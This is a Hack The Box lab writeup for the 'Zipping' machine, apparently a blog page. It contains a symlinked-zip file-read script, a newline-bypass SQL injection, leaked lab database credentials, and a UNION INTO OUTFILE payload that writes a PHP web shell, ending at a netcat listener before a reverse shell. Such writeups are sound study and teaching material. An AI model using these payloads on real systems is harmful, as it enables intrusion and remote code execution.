@@ -1,0 +1,468 @@
+<!doctype html>
+<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Bajo el teclado</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+  
+
+
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../pointed.png"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        pointedsec
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    if pentester.found == bug { make(pentester,states.happy) }
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="http://github.com/pointedsec" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
+                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
+                            <i class="fas fa-at fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://pointedsec.vercel.app" target="_blank">
+                            <i class="fas fa-globe fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
+                            <i class="fas fa-box fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-4 ml-sm-5">
+        <h1 id="hack-the-box-zipping-writeup">Hack The Box: Zipping Writeup</h1>
+<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Zipping&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h1 id="tcp-enumeration">TCP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.229.87 --ulimit <span style="color:#ae81ff">5000</span> -g 
+</span></span><span style="display:flex;"><span>10.129.229.87 -&gt; <span style="color:#f92672">[</span>22,80<span style="color:#f92672">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p22,80 -sCV 10.129.229.87 -oN allPorts
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-03 22:05 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.87
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.54 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: Zipping | Watch store
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.54 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 8.53 seconds
+</span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.229.87 -oN allPorts.UDP
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-03 22:06 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.87
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1494</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE  SERVICE
+</span></span><span style="display:flex;"><span>67/udp    closed dhcps
+</span></span><span style="display:flex;"><span>5002/udp  closed rfe
+</span></span><span style="display:flex;"><span>24606/udp closed unknown
+</span></span><span style="display:flex;"><span>27482/udp closed unknown
+</span></span><span style="display:flex;"><span>28609/udp closed unknown
+</span></span><span style="display:flex;"><span>30909/udp closed unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.82 seconds
+</span></span></code></pre></div><p>El único punto de ataque por ahora es el puerto 80/TCP .</p>
+<h1 id="http-enumeration">HTTP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ whatweb http://10.129.229.87
+</span></span><span style="display:flex;"><span>http://10.129.229.87 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.54<span style="color:#f92672">]</span>, Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, Email<span style="color:#f92672">[</span>info@website.com<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>Apache/2.4.54 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.129.229.87<span style="color:#f92672">]</span>, JQuery
+</span></span></code></pre></div><p>Encontramos unos nombre de usuarios.
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+<p>Encontramos una funcionalidad<code>/upload.php</code></p>
+<p>Dice que solo acepta un archivo zip y dentro debe de haber un archivo pdf que contenga un curriculum.
+Viendo que la máquina se llama Zipping, supongo que los tiros deben de ir por aquí.
+<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+<p>Probando la funcionalidad, subí un archivo .zip con un archivo .txt dentro y parece que comprueba que sea un archivo pdf.
+<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
+<p>Si subimos un archivo con el formato que se nos pide, vemos que nos devuelve una ruta.</p>
+<p><img src="images/Screenshot_4.png" alt="Write-up Image"></p>
+<p>Y podemos ver el archivo PDF.
+<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
+<h1 id="lfi-1">LFI 1</h1>
+<p>Después de intentar burlar la subida del archivo, me encontré con este <a href="https://www.youtube.com/watch?v=mnUaDCNaYwg">video</a>.</p>
+<p>Donde podemos conseguir un LFI a través de enlaces simbólicos.</p>
+<p>Vamos a crear una prueba de concepto, haciendo un enlace simbólico llamado <code>test.pdf</code> al <code>/etc/passwd</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ln -s /etc/passwd test.pdf
+</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/zipping/content<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ ls
+</span></span><span style="display:flex;"><span>test.pdf
+</span></span></code></pre></div><p>Ahora creamos el archivo .zip</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ zip -r --symlink test.zip *
+</span></span><span style="display:flex;"><span>  adding: test.pdf <span style="color:#f92672">(</span>deflated 65%<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Y ahora solicitando este archivo por curl&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> curl http://10.129.229.87/uploads/e8e7b570702ae4e2572f607419225362/test.pdf
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>pollinate:x:105:1::/var/cache/pollinate:/bin/false
+</span></span><span style="display:flex;"><span>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>rektsu:x:1001:1001::/home/rektsu:/bin/bash
+</span></span><span style="display:flex;"><span>mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span style="display:flex;"><span>_laurel:x:999:999::/var/log/laurel:/bin/false
+</span></span></code></pre></div><p>¡Eso fue fácil!</p>
+<p>Ahora vamos como nos podemos aprovechar de este LFI, pero antes voy a scriptear esto ya que si no voy a tardar mucho en solicitar el archivo, ya que para cada uno tendría que crear el enlace simbólico, el zip y subirlo&hellip;</p>
+<p>Este es el script</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> signal
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BASE_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://10.129.229.87&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">def_handler</span>(x,y):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[i] Saliendo...&#34;</span>)
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>signal<span style="color:#f92672">.</span>signal(signal<span style="color:#f92672">.</span>SIGINT, def_handler)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_symbolic_link</span>(file):
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;ln -s </span><span style="color:#e6db74">{</span>file<span style="color:#e6db74">}</span><span style="color:#e6db74"> pwn.pdf&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;pwn.pdf&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_zip_file</span>(link_path):
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;zip -r --symlink pwn.zip </span><span style="color:#e6db74">{</span>link_path<span style="color:#e6db74">}</span><span style="color:#e6db74"> &gt;&gt; /dev/null&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;pwn.zip&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_file</span>(zip_path):
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>    files <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;zipFile&#39;</span>: (<span style="color:#e6db74">&#39;pwn.zip&#39;</span>, open(zip_path,<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read())}
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;submit&#39;</span>: <span style="color:#e6db74">&#39;&#39;</span>}
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/upload.php&#39;</span> <span style="color:#f92672">%</span> BASE_URL, files<span style="color:#f92672">=</span>files,data<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    soup <span style="color:#f92672">=</span> BeautifulSoup(res<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
+</span></span><span style="display:flex;"><span>    links <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find_all(<span style="color:#e6db74">&#39;a&#39;</span>)
+</span></span><span style="display:flex;"><span>    href_values <span style="color:#f92672">=</span> [link<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;href&#39;</span>) <span style="color:#66d9ef">for</span> link <span style="color:#f92672">in</span> links]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    pattern <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;^uploads/[0-9a-f]</span><span style="color:#e6db74">{32}</span><span style="color:#e6db74">/pwn\.pdf$&#39;</span>)
+</span></span><span style="display:flex;"><span>    filtered_hrefs <span style="color:#f92672">=</span> [link<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;href&#39;</span>) <span style="color:#66d9ef">for</span> link <span style="color:#f92672">in</span> links <span style="color:#66d9ef">if</span> pattern<span style="color:#f92672">.</span><span style="color:#66d9ef">match</span>(link<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;href&#39;</span>))]
+</span></span><span style="display:flex;"><span>    upload_url <span style="color:#f92672">=</span> filtered_hrefs[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> upload_url    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_file</span>(upload_path):
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(BASE_URL<span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> upload_path)
+</span></span><span style="display:flex;"><span>    print(res<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>         
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">lfi</span>(file):
+</span></span><span style="display:flex;"><span>    link_path <span style="color:#f92672">=</span> create_symbolic_link(file)
+</span></span><span style="display:flex;"><span>    zip_path <span style="color:#f92672">=</span> create_zip_file(link_path)
+</span></span><span style="display:flex;"><span>    upload_url <span style="color:#f92672">=</span> upload_file(zip_path)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Borrando los archivos para poder solicitar el siguiente</span>
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;rm pwn.zip pwn.pdf&#34;</span>)
+</span></span><span style="display:flex;"><span>    read_file(upload_url)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>        file <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>        lfi(file)
+</span></span></code></pre></div><p>En el archivo <code>/var/www/html/shop/product.php</code>
+Vemos lo siguiente</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/^.*[A-Za-z!#$%^&amp;*()\-_=+{}\[\]</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">|;:&#39;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,.&lt;&gt;\/?]|[^0-9]$/&#34;</span>, $id, $match)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: index.php&#39;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Prepare statement and execute, but does not prevent SQL injection
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $stmt <span style="color:#f92672">=</span> $pdo<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#34;SELECT * FROM products WHERE id = &#39;</span><span style="color:#e6db74">$id</span><span style="color:#e6db74">&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span>        $stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">execute</span>();
+</span></span></code></pre></div><p>Si cargamos el archivo <code>/var/www/html/shop/functions.php</code>
+Vemos lo siguiente</p>
+<pre tabindex="0"><code>	$DATABASE_HOST = &#39;localhost&#39;;
+    $DATABASE_USER = &#39;root&#39;;
+    $DATABASE_PASS = &#39;MySQL_P@ssw0rd!&#39;;
+    $DATABASE_NAME = &#39;zipping&#39;;
+</code></pre><h1 id="sql-injection---bypassing-preg_match">SQL Injection -&gt; Bypassing preg_match()</h1>
+<p>Por ahora no nos sirve de nada, lo único que sabemos gracias a la credencial que por detrás la base de datos es MySQL, MariaDB, o variados.</p>
+<p>Antes, paralelamente estaba ejecutando un <code>sqlmap</code> para ver si este campo era vulnerable a SQL pero no encontró nada.
+Ahora sabiendo como funciona por detrás y viendo la expresión regular que emplea, podemos intentar bypassearla.
+<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match</a></p>
+<p>No lo había incluido, pero había un apartado en el sitio web donde vi antes un parámetro <code>id</code> que me llamó la atención por un posible SQLi.
+<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
+<p>Si intentamos hacer una inyección SQL normal nos redirecciona al <code>index.php</code>
+<code>http://10.129.229.87/shop/index.php?page=product&amp;id=2 or 1=1-- -</code></p>
+<p>Si probamos el payload <code>%0A100'+or+'1'='1</code> vemos el primer reloj (id 1), esto significa que se está aconteciendo una SQLi.
+<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
+<p>Existen 8 columnas por detrás.
+<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
+<p>Podemos ver también la versión de base de datos.
+<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
+<p>También podemos comprobar el usuario.
+<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
+<p>Podemos ver donde se almacenan los privilegios del usuario en MariaDB.
+<a href="https://mariadb.com/kb/en/information-schema-user_privileges-table/">https://mariadb.com/kb/en/information-schema-user_privileges-table/</a></p>
+<p>Se almacena en <code>information-schema.user_privileges</code></p>
+<h1 id="foothold">Foothold</h1>
+<p>Este es el payload para filtar por los permisos de nuestro usuario <code>root@localhost</code>
+<code>%0A100%27+union+select+1,group_concat(grantee,privilege_type),3,4,5,6,7,8+from+information_schema.user_privileges+where+grantee+like+%27%root%%27+--+-1</code>
+<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
+<p>Cuidado, tenemos permiso para poder crear archivos, lo podríamos utilizar para crear una Web Shell y a través del LFI explotarla, aun que probablemente no pueda explotar la Web Shell debido a que no se interpretará el PHP en el PDF&hellip;
+<img src="images/Screenshot_12.png" alt="Write-up Image">
+Viendo la documentación de MariaDB
+<a href="https://mariadb.com/kb/en/select-into-outfile/">https://mariadb.com/kb/en/select-into-outfile/</a></p>
+<p>Podríamos crear un archivo haciendo un
+<code>SELECT &quot;LOQUESEA&quot; INTO OUTFILE pointed.php</code></p>
+<p>Preparamos el payload, y ahora solo falta crear el archivo..
+<img src="images/Screenshot_13.png" alt="Write-up Image"></p>
+<p><code>http://10.129.229.87/shop/index.php?page=product&amp;id=%0A100%27+union+select+1,%22%3C?php%20echo%20shell_exec($_GET[%27cmd%27]);%20?%3E%22,3,4,5,6,7,8+into+outfile+&quot;/var/www/html/pointed.php&quot;--+-1</code></p>
+<p>No tenemos permisos para crear archivos en la aplicación web. Esperable.</p>
+<p>Revisando el archivo <code>/var/www/html/shop/index.php</code> vemos que es vulnerable a un LFI y además se concatena la extensión <code>.php</code> al final, y como lo que queremos es cargar un archivo PHP, nos viene al pelo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Include functions and connect to the database using PDO MySQL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;functions.php&#39;</span>;
+</span></span><span style="display:flex;"><span>$pdo <span style="color:#f92672">=</span> <span style="color:#a6e22e">pdo_connect_mysql</span>();
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$page <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;page&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">file_exists</span>($_GET[<span style="color:#e6db74">&#39;page&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.php&#39;</span>) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;page&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;home&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Include and show the requested page
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">include</span> $page <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.php&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Podemos probar a crearlo en <code>/tmp/pointed.php</code>
+<code>http://10.129.229.87/shop/index.php?page=product&amp;id=%0A100%27+union+select+1,%22%3C?php%20echo%20shell_exec($_GET[%27cmd%27]);%20?%3E%22,3,4,5,6,7,8+into+outfile+%22/tmp/pointed.php%22--+-1</code></p>
+<p>Por alguna razón a <code>/tmp/pointed.php</code> no puedo subir el archivo.
+<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
+<p>Pero si probamos a subirlo a <code>http://10.129.229.87/shop/index.php?page=product&amp;id=%0A100%27+union+select+1,%22%3C?php%20echo%20shell_exec($_GET[%27cmd%27]);%20?%3E%22,3,4,5,6,7,8+into+outfile+%22/dev/shm/pointed.php%22--+-1</code></p>
+<p>¡Conseguimos al fin una Web Shell!
+<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
+<p>Si nos ponemos en escucha con <code>netcat</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Podemos tratar de mandarnos una Reverse Shell</p>
